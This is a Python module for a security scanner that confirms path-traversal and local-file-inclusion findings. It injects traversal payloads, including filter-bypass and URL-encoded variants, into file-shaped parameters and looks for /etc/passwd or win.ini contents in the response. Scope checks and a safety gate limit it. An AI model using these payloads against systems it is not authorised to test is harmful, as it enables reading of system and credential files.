"""
Path-traversal / local-file-inclusion confirmation leg (deterministic, in-band
canonical-file signal).

Detection of this class had a hole the others didn't: there was no `path_traversal`
category at all, so a finding labelled "directory traversal" / "LFI" canonicalised
to nothing and was silently NOT_TESTED (categories.py now defines it). This leg is
the confirmation half: inject a traversal sequence into a file/path-shaped
parameter and check the RESPONSE for the unmistakable contents of a well-known
system file -- `/etc/passwd` (`root:...:0:0:`) on POSIX, `win.ini`
(`[extensions]` / `for 16-bit app support`) on Windows. Matching the actual file
contents, not just a 200, is what separates a confirmed read from a reflected
echo.

Fires on path_traversal findings, or -- shape-decoupled, like the ssrf/xxe legs --
on any request carrying a file/path-shaped parameter. Scope-gated; active
(validators.active_enabled), and a non-GET replay additionally needs
validators.allow_mutating_replay (safety gate).
"""
from __future__ import annotations

import re
from urllib.parse import urlsplit

import httpx

import global_throttle
from models import Finding, HttpExchange
from safety_gate import GatedAsyncClient, get_default_gate, SafetyGateBlocked
from .base import Validator, ValidationResult
from .injection_targets import param_targets, mutate, replay_headers

# Parameter names that commonly carry a file path (by name), plus a value-shape
# check (a value that looks like a filename or a path) so an oddly-named param
# still gets tried.
_FILE_PARAM_NAMES = {"file", "filename", "path", "filepath", "page", "template", "doc",
                     "document", "download", "load", "read", "include", "view", "img",
                     "image", "attachment", "name", "dir", "folder", "resource", "item"}
_FILE_VALUE = re.compile(r"(^|/)[\w\-. ]+\.\w{1,5}$|[\\/]")

# Traversal payloads: deep POSIX + Windows, a couple of well-known filter bypasses
# (`....//` collapses to `../` after a naive strip; URL-encoded dots), and absolute
# paths. `{f}` is one of the two canonical target files.
_PREFIXES = ("../../../../../../../../", "..\\..\\..\\..\\..\\..\\..\\..\\",
             "....//....//....//....//....//", "%2e%2e%2f" * 8, "/", "")
_TARGETS = {
    "etc/passwd": re.compile(r"root:.*:0:0:", re.IGNORECASE),
    "windows/win.ini": re.compile(r"\[extensions\]|for 16-bit app support", re.IGNORECASE),
}
_MAX_PARAMS = 6


def _file_shaped(exchange: HttpExchange) -> list[tuple[str, str]]:
    out = []
    from urllib.parse import parse_qsl
    qs = dict(parse_qsl(urlsplit(exchange.url).query, keep_blank_values=True))
    for loc, param in param_targets(exchange):
        val = qs.get(param, "") if loc == "query" else ""
        if param.lower() in _FILE_PARAM_NAMES or _FILE_VALUE.search(val or ""):
            out.append((loc, param))
    return out


class PathTraversalValidator(Validator):
    name = "path_traversal"
    finding_classes = {"path_traversal", "path traversal", "directory traversal",
                       "lfi", "local file inclusion", "file inclusion"}
    active = True

    def __init__(self, *, allowed_hosts: list[str] | None = None, timeout: float = 10.0):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout

    def applies(self, finding: Finding, exchange: HttpExchange) -> bool:
        return (super().applies(finding, exchange) and bool(param_targets(exchange))) \
            or bool(_file_shaped(exchange))

    def _skip(self, why: str) -> ValidationResult:
        return ValidationResult(self.name, "skipped", "path_traversal", summary=why)

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        host = urlsplit(exchange.url).hostname or ""
        if self.allowed_hosts and host not in self.allowed_hosts:
            return self._skip(f"host {host!r} out of scope")
        # Prefer file-shaped params; fall back to all params when the finding
        # explicitly says path traversal but no param name looked file-ish.
        targets = _file_shaped(exchange) or param_targets(exchange)
        targets = targets[:_MAX_PARAMS]
        if not targets:
            return self._skip("no file/path-shaped parameter to inject a traversal into")
        method = (exchange.method or "GET").upper()
        headers = replay_headers(exchange)
        for loc, param in targets:
            for prefix in _PREFIXES:
                for target, marker in _TARGETS.items():
                    url, body = mutate(exchange, loc, param, prefix + target)
                    try:
                        await global_throttle.acquire()
                        async with GatedAsyncClient(get_default_gate(), self.name, timeout=self.timeout,
                                                    follow_redirects=False, verify=False) as client:
                            resp = await client.request(method, url, headers=headers or None,
                                                        content=body or None)
                    except SafetyGateBlocked:
                        return self._skip("mutating path-traversal replay not authorized "
                                          "(set validators.allow_mutating_replay)")
                    except httpx.HTTPError:
                        continue
                    try:
                        text = resp.text
                    except Exception:
                        continue
                    if marker.search(text):
                        return ValidationResult(
                            self.name, "confirmed", "path_traversal", confidence=0.95, confirmed=True,
                            summary=f"Path traversal confirmed: the {loc} parameter {param!r} read an "
                                    f"arbitrary file outside the intended directory.",
                            evidence=f"Set {param!r} to `{prefix + target}`; the response contained the "
                                     f"canonical contents of {target} (matched /{marker.pattern}/).")
        return ValidationResult(
            self.name, "not_confirmed", "path_traversal", confidence=0.0, confirmed=False,
            summary="No system-file contents returned -- traversal appears blocked or the param is not a file read",
            evidence=f"Tried {len(targets)} parameter(s) across {len(_PREFIXES)} traversal encodings; "
                     f"neither /etc/passwd nor win.ini contents appeared.")
